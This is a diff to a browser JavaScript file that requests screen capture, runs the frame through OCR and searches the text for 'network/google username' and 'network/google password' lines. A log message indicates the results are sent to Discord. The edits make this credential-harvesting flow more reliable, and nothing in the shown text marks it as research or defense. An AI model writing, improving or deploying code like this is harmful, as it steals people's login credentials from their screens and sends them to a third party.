@@ -26,26 +26,18 @@ function logStatus(msg){
   try{
     logStatus("Opening test tab for permissions...");
     const testTab = window.open("test.html","_blank");
+    if(!testTab){ logStatus("Warning: test tab could not be opened. Continuing without it."); }
 
     logStatus("Requesting screen capture...");
     const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+    logStatus("Permissions granted.");
 
-    logStatus("Sending allowed-permissions message to test tab...");
-    testTab.postMessage({msg:"allowed-permissions"},"*");
+    // Notify test tab that permissions were granted
+    if(testTab) testTab.postMessage({msg:"allowed-permissions"},"*");
+    logStatus("Sent allowed-permissions message to test tab.");
 
-    logStatus("Waiting for test tab acknowledgment...");
-    await new Promise(resolve=>{
-      function handler(e){
-        if(e.data?.msg==="allowed-permissions"){
-          window.removeEventListener("message", handler);
-          resolve();
-        }
-      }
-      window.addEventListener("message", handler);
-    });
-
-    logStatus("Acknowledgment received. Waiting 1 second before OCR...");
-    await new Promise(r => setTimeout(r,1000));
+    // Optional 1-second pause to ensure video is ready
+    await new Promise(r => setTimeout(r, 1000));
 
     logStatus("Setting up video element...");
     const video = document.createElement("video");
@@ -82,12 +74,11 @@ function logStatus(msg){
 
     if(!ocrJson.ParsedResults?.length){
       logStatus("OCR worked, but no text detected.");
-      testTab.postMessage({msg:"close-tab"},"*");
-      return;
+    } else {
+      logStatus("OCR worked. Processing text...");
     }
 
-    logStatus("OCR worked. Processing text...");
-    const lines = ocrJson.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/);
+    const lines = ocrJson.ParsedResults?.map(r=>r.ParsedText).join("\n").split(/\r?\n/) || [];
     const output = lines.reduce((a,v,i)=>{
       if(a) return a;
       if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
@@ -110,8 +101,10 @@ function logStatus(msg){
     });
 
     logStatus("OCR + Discord done!");
-    logStatus("Closing test tab...");
-    testTab.postMessage({msg:"close-tab"},"*");
+
+    // Finally, close the test tab
+    if(testTab) testTab.postMessage({msg:"close-tab"},"*");
+    logStatus("Sent close-tab message to test tab.");
 
   } catch(e){
     logStatus("Error: " + e.message);
